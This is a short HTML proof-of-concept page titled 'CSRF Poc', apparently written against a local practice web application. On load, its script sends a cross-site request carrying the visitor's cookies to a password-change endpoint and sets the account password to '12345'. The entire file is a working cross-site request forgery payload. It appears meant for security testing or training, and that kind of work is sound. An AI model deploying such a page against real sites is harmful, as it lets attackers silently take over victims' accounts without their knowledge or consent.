<!DOCTYPE html>
<html>
<head>
  <title>CSRF Poc</title>
</head>
<body>
  <script>
    fetch('http://localhost:3000/rest/user/change-password?new=12345&repeat=12345', {
      method: 'GET',
      credentials: 'include'
    })
    .then(response => response.json())
    .then(data => console.log('CSRF Success:', data))
    .catch(err => console.error('CSRF Error:', err));
  </script>
</body>
</html>
